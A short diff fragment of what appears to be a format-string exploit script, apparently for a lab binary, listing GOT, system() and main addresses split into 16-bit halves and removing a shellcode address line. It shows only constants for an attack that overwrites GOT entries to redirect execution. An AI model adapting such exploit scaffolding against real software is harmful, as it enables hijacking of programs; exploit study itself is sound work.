@@ -7,7 +7,6 @@ exit_got = 0x80499b8
 system = 0xb7e63190
 sys1 = system & 0xffff
 sys2 = system >> 16
-shellcode_addr = 0xbffff680
 printf_got = 0x80499ac
 main = 0x804868d
 vl1 = main & 0xffff
